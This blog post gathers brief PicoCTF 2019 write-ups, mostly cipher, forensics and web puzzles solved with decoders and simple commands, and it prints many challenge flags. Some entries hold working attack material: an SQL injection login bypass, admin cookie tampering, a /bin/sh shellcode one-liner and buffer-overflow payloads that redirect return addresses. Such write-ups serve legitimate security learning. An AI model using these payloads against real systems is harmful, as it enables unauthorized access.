---
layout: default
title:  "PicoCTF 2019 Write-ups"
date:   2019-10-18 
categories: jekyll update post writeup
---

The following are some brief write-ups of some challenges we solved for PicoCTF 2019. It is not comprehensive or well-formatted, but I thought I should post it for posterity anyway.

### Glory of the Garden - (50 points) 
Download the garden.jpg file by clicking on the garden link provided
Then open up a hex editor app or website (I used HexEd.it site.)
Click “Open file” and insert the garden.jpg file.
Now look on the right side of the browser and scroll all the way down until you see the flag shown here in the red circle:
 

### Easy1 Crypto 100 
https://www.dcode.fr/vigenere-cipher
Enter in the ciphertext and key in corresponding places. Then you should get CRYPTOISFUN.

### unzip - (50 points)
Download the unzip file
Since I am on Kali Linux, I used the Archive Manager to unzip the file
The result is discovering the flag.png file, which looks like this: 

### 13 - ROT13
https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,13)&input=Y3ZwYlBHU3thYmdfZ2JiX29ucV9ic19uX2NlYm95cnp9


### Bases - Points: 100
Use the base64 -d command on the supplied string: bDNhcm5fdGgzX3IwcDM1
The decoded string is l3arn_th3_r0p35

### Web - dontuseclientside - Points: 100 
Piece together the flag from reading the source code. 


picoCTF{no_clients_plz_577431}

### Web - Where are the robots - 100 

This is a reference to the infamous /robots.txt file
go to https://2019shell1.picoctf.com/problem/12267/robots.txt
Find a /713d3.html so go to https://2019shell1.picoctf.com/problem/12267/713d3.html


### First Grep - (100 points) 
Download the file provided via the link
Since I am on Linux, I opened up terminal and changed directory to Downloads
Next, I typed the following: egrep ‘’ file
Then I just examined the text until I found the flag, which was in the middle of the block of text:  

### Extensions - (150 points) 
Download the file via the provided link
Then went to a decoder and encoder site
I scrolled down to the file upload part, clicked on it, and behold this flag I found unintentionally: 
Hard to see but the flag says: picoCTF{now_you_know_about_extensions}

### Flags - (200 points) 
Download the flags.png file
I looked for hours about what these flags could mean and something told me to type “cipher with flags” into Google and I found out that these are International Maritime Signal Flags 
I basically followed the flags → letters conversion on the wikipedia page and got this: 

### So Meta - (150 points) 
Download the image file
I took a look at it and figured that I needed to open up Terminal on Kali Linux, so I did
I typed cat [file name] and scrolled to the bottom to find this: 
Flag is: picoCTF{s0_m3ta_dc38ce45}

### Practice-Run-1 - (50 points)
Download the run_this program
Open up Terminal and type ./run_this (it will execute the program in Terminal)
Then here you go: 
Flag is: picoCTF{g3t_r3adY_2_r3v3r53}

### caesar - (100 points)
Download the ciphertext file 
Since it is caesar cipher encryption, you have to decrypt it; I went to Caesar Cipher Encryption Tool to decrypt it
Then I tried different shift amounts until I got to this point:
Flag is: picoCTF{crossingtherubiconvyfzxekt}

### Tapping - (200 points)
This is not a downloadable thing so open up Terminal and type the following command they tell you in the prompt: nc 2019shell1.picoctf.com 37920
Once you do that, you should see something like this: 
Knowing from experience, I figure this was morse code so I opened a morse code decoder and encoder website and got this: 
The flag was capitalized so I typed in this and got it correct: 
Flag is: PICOCTF{M0RS3C0D31SFUN3960854397}

### plumbing (200 points) 
Open up terminal and type the following: nc 2019shell1.picoctf.com 18944 > [whatever file name you want] (This will redirect the output to a new file, which will be in the default location.)
Next, type in this: grep “pico” [your filename] and you should get this: 
Flag is: picoCTF{digital_plumb3r_1d5b7de7}



### whats-the-difference
Run the 2 supplied images through a diff, for this I used radiff2
radiff2 -x cattos.jpg kitters.jpg

The flag will be the diff in red picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_je11y_aslkjfdsalkfslkflkjdsfdszmz10548}


### vault-door-1 
Painstakingly match charAt(1) to d, charAt(2) to 3, etc...

picoCTF{d35cr4mbl3_tH3_cH4r4cT3r5_51e7fd}

### client-side-again
There is some weird JavaScript on the site.
Look at https://lelinhtinh.github.io/de4js/ to decode it
Guess the flag from looking at this array: var _0x5a46 = ['55670}', '_again_0', 'this', 'Password Verified', 'Incorrect password', 'getElementById', 'value', 'substring', 'picoCTF{', 'not_this'];

picoCTF{not_this_again_055670}

### logon 
I knew I was being stupid! Just login with anything and change the cookie admin to True.

picoCTF{th3_c0nsp1r4cy_l1v3s_2e19dad3}

### waves over lambda
Input the text you receive from the netcat connection into https://www.guballa.de/substitution-solver. This is called a substitution cipher.

picoCTF{frequency_is_c_over_lambda_fdiiirubra}

### la cifra de (200 points)
Looking at the phrase “la cifra de” as an Italian major, I noticed this derived somehow from Italian and behold the fact that the creator of Vigenère cipher, was indeed Italian
With this information, I used the website Lucas had used for one of the challenges and got the flag that way, using the Classical Vigenere variant of the cipher:

Flag is: picoCTF{b311a50_0r_vign3r3_ciph3r1119c336}


### open-to-admins 
add a cookie admin, set that value to True
add a cookie time, set that value to 1400
Access /flag

You can add cookies in Mozilla Firefox by inspecting element -> storage -> click + in upper right hand corner

picoCTF{0p3n_t0_adm1n5_00cd0fe1}

picobrowser 

Using Burp Suite, I intercepted the POST request, and changed the User-Agent to picobrowser. (I know below says I changed it to browser but change it to picobrowser)


### mus1c (300 points)
Download the mus1c.txt file and open up Terminal to do the “cat” command in order to see the contents of the file
I was thinking about this for a while and something told me to type in “master rockstar” based on the hint but that did not work so I typed in “rockstar language” and I found that this is an esoteric programming language created in 2018. I ended up finding the official Rockstar website and entered the rockstar text and I received the output as shown here: 

Then I looked at the output and thought, “Um, seems familiar” and it was due to it being decimal so I decoded the decimal numbers to ascii text and got this, the flag - using this website:

Flag is: picoCTF{rrrocknrn0113r}

### Irish Name Repo 
Enter ‘ OR 1=1;-- for both username and password


### Mr World-Wide
Googled all the coordinates and found their city
The first letters of the cities spell out to KODIAK_ALASKA
picoCTF{(35.028309, 135.753082)(46.469391, 30.740883)(39.758949, -84.191605)(41.015137, 28.979530)(24.466667, 54.366669)(3.140853, 101.693207)_(9.005401, 38.763611)(-3.989038, -79.203560)(52.377956, 4.897070)(41.085651, -73.858467)(57.790001, -152.407227)(31.205753, 29.924526)}
= Kyoto Odesa Dayton Istanbul (Abu Dhabi) (Kuala Lumpur)_ (Addis Adaba) (Loja) Amsterdam (Sleepy Hollow) Kodiak Alexandria

### handy-shellcode 
Googled for x86-64 shellcode cat flag.txt
Run this command:
(python -c "print '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"; cat) | ./vuln

Those weird numbers are assembly instructions converted into a string for you to run. Usually, we don’t write shellcode ourselves and find existing shellcode on Google. But in more advanced problems, you’ll be required to write your own shellcode.
This pipes the shellcode into the vulnerable binary, and doesn’t exit out of the program.


### 1_wanna_b3_a_r0ck5tar
Convert the text to Rockstar programming language
Use transpiler https://github.com/yanorestes/rockstar-py to convert it to python
Notice all the numbers seem like they can be converted to characters
they do! == bonjovi



### OverFlow 0 

Literally just overflow the buffer by entering a ton of characters.
They have a segmentation fault handler that just prints the flag as soon as there is a segfault.

picoCTF{3asY_P3a5y4a888b8e}


### OverFlow 1 
Examine the source code, in order to print the flag, we just have to change the return address in the vuln() function so that it executes the flag() function.
Find the address of the flag function in memory in gdb with the command `x flag`. 
Use python to create a payload to test on gdb:
    `python -c "print 64*'A'+'BBBBCCCCDDDDEEEE'" > payload`
I print 64 A’s because it’s the size of the buffer we need to overflow, then I add some padding with ‘BBBBCC…’ to see exactly where the return address should be. 
In GDB, I examine the stack and see that ‘45454545’ is where the return address should be. This hex corresponds to EEEE in ascii, so I change the payload and add the return address of flag that I found in GDB earlier:
    `python -c "print 64*'A'+'BBBBCCCCDDDDEEEE'+'\xe6\x85\x04\x08'" > payload`
It works! Now use the final exploit on the picoctf shell server:
    `python -c "print 64*'A'+'BBBBCCCCDDDDEEEE'+'\xe6\x85\x04\x08'"  | vuln`

    picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5fe1ff3d8}
(BTW if you try to edit this locally, you can use the `touch flag.txt` command to get rid of the error message)


### Overflow 2 
Use the same method as Oveflow 1 to steer program execution to the flag function.
I achieved it by using this as program input: ` python -c "print 'A'*176 + 'BBBBCCCCDDDD' + '\x36\x85\x04\x08'"`
This time we need to add function arguments. In GDB, I used the command `disas flag` to disassemble the flag function.
On line <flag+100>, this assembly is run `cmp    DWORD PTR [ebp+0x8], 0xdeadbeef`
From here I know that the first compared argument, 0xdeadbeef, is stored at ebp+0x8 (and two lines down tells me the next argument is stored in ebp+c) 
Looking at the register values with command `info register` I see that ebp points to a place not much farther in memory than esp, so I modify my input as follows to see what happens: `python -c "print 'A'*176 + 'BBBBCCCCDDDD' + '\xe6\x85\x04\x08' + 'AAAABBBBDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP'"`
When I run gdb again with a breakpoint set in the flag function, I can examine the value [ebp+0x8] with the command `x/wx $ebp+0x8` and see that it is 0x42424242 which corresponds to hex BBBB
After some finagling of my input and examing with GDB, I make the final payload and submit it to the vulnerable program on the shell server with the following command:
`python -c "print 'A'*176+'BBBBCCCCDDDD'+'\xe6\x85\x04\x08'+'AAAA'+'\xEF\xBE\xAD\xDE'+'\x0D\xD0\xDE\xC0'" | ./vuln`

### What Lies Within (150 points) 
Download the buildings.png 
I tried to do saturation and all that jazz but that did not work so I looked up steganography stuff and I found this website
Then I uploaded the image and got this:

Flag is: picoCTF{h1d1ng_1n_th3_b1t5}


### shark on wire 1 - Points: 150 
1.      Opened pcap file in wireshark
2.      Filtered by udp

3.      Ordered by destination IP
4.      You will notice 10.0.0.12 has a data length of 1 byte, each byte containing a character.

5.      Going through these packets gives you the flag picoCTF
6.      There is also a false flag to the ip 10.0.0.13 That contains the string N0t_a_fLag
 


### Like1000
Given a file: 1000.tar, untarring recursively gives the files 999.tar, 998.tar, etc…
Write a bash script!

#!/bin/bash
for i in {1000..1}
do
    tar -xvf ./$i.tar
Done
Execute the bash script and open the last tar file to get a png file with the flag.

